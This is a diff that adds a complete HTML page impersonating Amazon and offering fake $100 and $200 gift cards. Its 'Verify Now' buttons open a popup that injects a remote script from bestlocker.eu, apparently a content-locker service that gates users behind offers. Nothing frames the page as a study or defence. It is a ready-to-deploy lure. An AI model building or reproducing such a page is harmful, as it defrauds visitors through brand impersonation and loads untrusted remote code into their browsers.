@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon Gift Card Rewards</title>
+  <style>
+    /* Background Aurora + Snow */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(270deg, #ff9a9e, #fad0c4, #fbc2eb, #a1c4fd, #c2e9fb);
+      background-size: 1200% 1200%;
+      animation: aurora 30s ease infinite;
+      overflow-x: hidden;
+    }
+    @keyframes aurora {
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
+    }
+
+    /* Snow effect */
+    .snow {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      background-image: url('https://i.ibb.co/GJqC3xT/snow.png');
+      animation: snow 20s linear infinite;
+      z-index: 1;
+    }
+    @keyframes snow {
+      from {background-position: 0 0;}
+      to {background-position: 0 1000px;}
+    }
+
+    /* Container */
+    .container {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    /* Title with rainbow glow */
+    h1 {
+      font-size: 2.5rem;
+      color: #fff;
+      text-shadow: 0 0 15px #fff;
+      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: rainbowText 5s linear infinite;
+    }
+    @keyframes rainbowText {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+
+    /* Card Grid */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      margin-top: 30px;
+    }
+
+    /* Amazon Gift Card Style */
+    .card {
+      position: relative;
+      padding: 20px;
+      border-radius: 20px;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 15px rgba(255,255,255,0.4);
+      border: 2px solid transparent;
+      background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
+        linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
+      background-origin: border-box;
+      background-clip: content-box, border-box;
+      animation: rainbowBorder 8s linear infinite;
+      color: #fff;
+      cursor: pointer;
+      overflow: hidden;
+    }
+    @keyframes rainbowBorder {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 200% 50%; }
+    }
+
+    /* Frost Shine animation */
+    .card::after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(120deg, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 60%);
+      transform: rotate(25deg);
+      animation: shine 5s infinite;
+    }
+    @keyframes shine {
+      0% { transform: translateX(-100%) rotate(25deg); }
+      100% { transform: translateX(100%) rotate(25deg); }
+    }
+
+    .card h2 {
+      font-size: 1.3rem;
+      margin: 10px 0;
+      color: #FF9900; /* Amazon orange */
+    }
+    .card p {
+      font-size: 1rem;
+      color: #ddd;
+    }
+
+    /* Verify Button */
+    .verify-btn {
+      display: inline-block;
+      margin-top: 15px;
+      padding: 12px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 30px;
+      background: #FF9900;
+      color: #111;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 15px rgba(255,153,0,0.7);
+      transition: all 0.3s;
+    }
+    .verify-btn:hover {
+      background: #e68a00;
+      box-shadow: 0 0 25px rgba(255,153,0,1);
+    }
+
+    /* Popup */
+    .popup {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(6px);
+    }
+    .popup-content {
+      background: rgba(255,255,255,0.1);
+      border-radius: 20px;
+      width: 90%;
+      max-width: 500px;
+      margin: 8% auto;
+      padding: 20px;
+      position: relative;
+      box-shadow: 0 0 25px rgba(255,255,255,0.6);
+      border: 2px solid transparent;
+      background-image: linear-gradient(rgba(255,255,255,0.05), rgba(255,255,255,0.05)),
+        linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
+      background-origin: border-box;
+      background-clip: content-box, border-box;
+      animation: rainbowPopup 8s linear infinite;
+      color: #fff;
+    }
+    @keyframes rainbowPopup {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 200% 50%; }
+    }
+    .close-btn {
+      position: absolute;
+      top: 8px; right: 12px;
+      font-size: 28px;
+      font-weight: bold;
+      color: #fff;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="snow"></div>
+  <div class="container">
+    <h1>🎁 Claim Your Amazon Gift Card</h1>
+    <div class="cards">
+      <div class="card">
+        <h2>$100 Amazon Gift Card</h2>
+        <p>Unlock this reward instantly</p>
+        <button class="verify-btn" onclick="openVerifyPopup()">Verify Now</button>
+      </div>
+      <div class="card">
+        <h2>$200 Amazon Gift Card</h2>
+        <p>Exclusive limited-time reward</p>
+        <button class="verify-btn" onclick="openVerifyPopup()">Verify Now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Popup -->
+  <div id="verifyPopup" class="popup">
+    <div class="popup-content">
+      <span class="close-btn">&times;</span>
+      <div id="verify-box"></div>
+    </div>
+  </div>
+
+  <script>
+    // Open popup + inject script dynamically
+    function openVerifyPopup() {
+      document.getElementById("verifyPopup").style.display = "block";
+
+      // Clear old script
+      document.getElementById("verify-box").innerHTML = "";
+
+      // Create new script tag
+      var s = document.createElement("script");
+      s.type = "text/javascript";
+      s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
+      s.onload = () => console.log("Locker Loaded ✅");
+      s.onerror = () => console.log("⚠️ Locker Failed to Load");
+      document.getElementById("verify-box").appendChild(s);
+    }
+
+    // Close popup
+    document.querySelector(".close-btn").onclick = () => {
+      document.getElementById("verifyPopup").style.display = "none";
+      document.getElementById("verify-box").innerHTML = "";
+    };
+  </script>
+</body>
+</html>
